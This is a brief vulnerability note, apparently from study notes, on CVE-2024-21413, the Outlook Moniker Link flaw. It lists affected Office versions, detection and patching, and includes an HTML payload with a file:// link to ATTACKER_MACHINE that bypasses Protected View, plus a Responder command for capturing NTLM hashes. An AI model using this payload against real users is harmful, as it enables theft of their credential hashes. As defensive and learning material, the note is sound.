# CVE-2024-21413


Publish date 13/2/2024
- [Microsoft Article of CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)
- [CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413) (Moniker Link)
- Haifei Li of Check Point Research is credited with [discovering the vulnerability](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/).

Affected versions of Office

|                                   |                                            |
| --------------------------------- | ------------------------------------------ |
| **Release**                       | **Version**                                |
| Microsoft Office LTSC 2021        | affected from 19.0.0                       |
| Microsoft 365 Apps for Enterprise | affected from 16.0.1                       |
| Microsoft Office 2019             | affected from 16.0.1                       |
| Microsoft Office 2016             | affected from 16.0.0 before 16.0.5435.1001 |

Outlook can render [[HTML]] and can parse hyperlinks; openning URL is also possible  by specifying a application called [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers).
```html
<!-- Using "file://" monkiker linker to instruct Outlook, meaning we can share file over SMB and bypassing protected view with ! -->
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

[CMNatic Exploit](https://github.com/CMNatic/CVE-2024-21413)
```bash
# Catch the hash!
responder -I $interface
```
#### Detection

[Neo23x0 Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar)
#### Remediation

Updating Office through Windows Update or the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Home.aspx)
## References

[THM Moniker Link](https://tryhackme.com/room/monikerlink)
[Microsoft Article of CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)
[CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413)
[Haifei Li of Check Point Research](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/)
[CMNatic Exploit](https://github.com/CMNatic/CVE-2024-21413)
[Neo23x0 Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar)